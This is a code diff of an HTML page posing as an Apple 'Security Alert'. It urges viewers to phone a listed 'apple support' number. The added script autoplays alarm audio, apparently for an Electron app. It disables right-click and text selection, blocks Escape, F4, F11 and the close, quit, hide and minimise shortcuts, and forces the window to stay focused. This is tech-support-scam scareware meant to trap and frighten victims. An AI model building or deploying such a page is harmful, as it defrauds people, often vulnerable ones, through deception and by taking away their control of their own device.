@@ -4,20 +4,14 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Full-Screen Popup Example</title>
+  <title>Security Alert OS</title>
   <link rel="stylesheet" href="styles.css" />
-  <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@100..900&display=swap" rel="stylesheet" />
-  <link href="https://unpkg.com/prismjs/themes/prism.css" rel="stylesheet" />
-  <link href="https://fonts.googleapis.com/css2?family=Geologica:wght@100..900&family=Lexend:wght@100..900&display=swap"
+  <link
+    href="https://fonts.googleapis.com/css2?family=Geologica:wght@100..900&family=Lexend:wght@100..900&display=swap"
     rel="stylesheet" />
-
-  <script>
-    if (!isSecureContext) location.protocol = "https:";
-  </script>
-  <script src="https://unpkg.com/prismjs"></script>
 </head>
 
 <body>
@@ -71,7 +65,7 @@
             </div>
             <div class="">
               <h6 class="card-title">
-                Please call apple support now To fix this issue
+                Please call apple support now To fix this issue
               </h6>
               <p class="desc">Immediate Action Is Required</p>
             </div>
@@ -84,7 +78,7 @@
     <div class="main-modal-2">
       <img src="./images/warning.png" alt="" class="warning_logo" />
       <h5 class="title">
-        Call apple support now To fix this issue +1 (843) 480 9415
+        Call apple support now To fix this issue +1 (843) 480 9415
       </h5>
 
       <button class="confirm_btn">OK</button>
@@ -94,13 +88,10 @@
       <source src="./images/audio.mp3" type="audio/mpeg" />
       Your browser does not support the audio element.
     </audio>
-
-    <!-- <audio id="background-audio" src="./images/17167046424682n662kss-voicemaker.in-speech.mp3" autoplay loop></audio> -->
   </div>
 
   <script>
     const audio = document.getElementById("background-audio");
-    let started = false;
 
     // Disable right click
     document.addEventListener("contextmenu", (event) => {
@@ -112,6 +103,12 @@
       event.preventDefault();
     });
 
+    // Disable text selection
+    document.addEventListener("selectstart", (event) => {
+      event.preventDefault();
+    });
+
+    // Try to play audio immediately (Electron allows autoplay)
     function tryPlayAudio() {
       if (audio) {
         audio.play().catch((error) => {
@@ -120,139 +117,57 @@
       }
     }
 
-    // Start on click anywhere in popup
-    document.getElementById("popup").addEventListener("click", async function startPage() {
-
-      if (started) return;
-
+    // Auto-play audio on load (Electron supports this without user gesture)
+    window.addEventListener("load", () => {
       tryPlayAudio();
-
-      try {
-        // Enter fullscreen
-        if (!document.fullscreenElement) {
-          await document.documentElement.requestFullscreen({
-            navigationUI: "hide"
-          });
-        }
-
-        // Lock Escape key
-        if (navigator.keyboard?.lock) {
-          try {
-            await navigator.keyboard.lock(["Escape"]);
-            console.log("Escape locked");
-          } catch (error) {
-            console.warn("Keyboard Lock unavailable:", error);
-          }
-        }
-
-        // Pointer lock
-        if (!document.pointerLockElement) {
-          await document.body.requestPointerLock();
-        }
-
-        started = true;
-
-        console.log("Fullscreen + ESC lock + Pointer Lock active");
-
-      } catch (error) {
-        console.error("Unable to start:", error);
-      }
-
     });
 
+    // Also try on any click as fallback
+    document.addEventListener("click", () => {
+      tryPlayAudio();
+    });
 
-    // Block ESC key
+    // Block all keyboard shortcuts from renderer side too
     window.addEventListener("keydown", function (event) {
       tryPlayAudio();
+
+      // Block Escape, F-keys, Alt, Ctrl combos
       if (
-        started &&
-        (event.key === "Escape" || event.keyCode === 27)
+        event.key === "Escape" ||
+        event.keyCode === 27 ||
+        event.key === "F4" ||
+        event.key === "F11" ||
+        (event.ctrlKey && event.key === "w") ||
+        (event.ctrlKey && event.key === "q") ||
+        (event.metaKey && event.key === "w") ||
+        (event.metaKey && event.key === "q") ||
+        (event.metaKey && event.key === "h") ||
+        (event.metaKey && event.key === "m") ||
+        (event.altKey && event.key === "F4")
       ) {
         event.preventDefault();
         event.stopPropagation();
         event.stopImmediatePropagation();
-
-        // Re-lock pointer
-        setTimeout(() => {
-          if (
-            started &&
-            document.fullscreenElement &&
-            !document.pointerLockElement
-          ) {
-            document.body.requestPointerLock();
-          }
-        }, 100);
-
         return false;
       }
-
     }, true);
 
-
-    // Block ESC key release
+    // Block key release too
     window.addEventListener("keyup", function (event) {
-
       if (
-        started &&
-        (event.key === "Escape" || event.keyCode === 27)
+        event.key === "Escape" ||
+        event.keyCode === 27
       ) {
         event.preventDefault();
         event.stopPropagation();
         event.stopImmediatePropagation();
-
         return false;
       }
-
     }, true);
-
-
-    // Re-lock pointer if ESC releases it
-    document.addEventListener("pointerlockchange", function () {
-
-      if (
-        started &&
-        document.fullscreenElement &&
-        !document.pointerLockElement
-      ) {
-        setTimeout(() => {
-          if (started && document.fullscreenElement) {
-            document.body.requestPointerLock();
-          }
-        }, 300);
-      }
-
-    });
-
-
-    // If fullscreen is exited, reset
-    document.addEventListener("fullscreenchange", function () {
-
-      if (!document.fullscreenElement && started) {
-
-        started = false;
-
-        if (navigator.keyboard?.unlock) {
-          navigator.keyboard.unlock();
-        }
-
-        if (document.pointerLockElement) {
-          document.exitPointerLock();
-        }
-
-
-        console.log("Fullscreen exited");
-      }
-
-    });
-
 
     // Keep window focused
     window.addEventListener("blur", function () {
-
-      if (started) {
-        window.focus();
-      }
-
+      window.focus();
     });
   </script>
 </body>
